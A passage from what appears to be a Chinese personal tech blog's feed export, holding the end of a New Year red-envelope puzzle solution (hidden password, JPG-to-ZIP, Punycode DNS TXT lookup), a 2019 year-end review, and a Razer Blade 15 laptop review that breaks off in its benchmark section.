<code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 